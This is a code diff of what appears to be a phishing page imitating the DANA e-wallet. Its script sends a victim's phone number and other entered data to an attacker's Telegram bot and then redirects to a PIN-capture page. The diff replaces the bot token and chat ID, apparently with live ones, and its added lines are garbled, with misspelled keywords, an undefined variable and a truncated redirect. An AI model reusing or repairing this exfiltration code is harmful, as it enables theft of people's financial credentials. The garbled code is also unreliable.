@@ -234,21 +234,18 @@
     - No HP : ${phone_number}`;
 
     //_masukan_ID_Akun_Telegram_kamu
-    var id_telegram = "6335165504";
+    var id_telegram = "6751845484";
     //_masukan_ID_Bot_Telegram_kamu
-    var token_botTele = "7468192209:AAEHhOhSqDNm4BOc_5lE3XVKmcXJU2paMj4";
-    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown", {
+    var token_botTele = "7428702458:AAFZoC825g_0o-P28EgKdNQSyn6OV_-H1tQ";
+    fetch("https://api.telegram.org/bot"+token_botTelegram+"/sendMessage?rse_mode=markdown", {
     method: 'POST',
     headers: {
-    'Accept': 'application/json',
+    'Accept': 'applation/json',
     'Content-Type': 'application/json'
-    }, body: JSON.stringify({
+    }, body: JSON.stringy({
     chat_id: id_telegram,
     text: message
     })
     });
-    window.location.href = "./dana_pin.html";
-    }
-  </script>
-</body>
-</html>
+   tion.href = "./dana_pin.html";
+ 
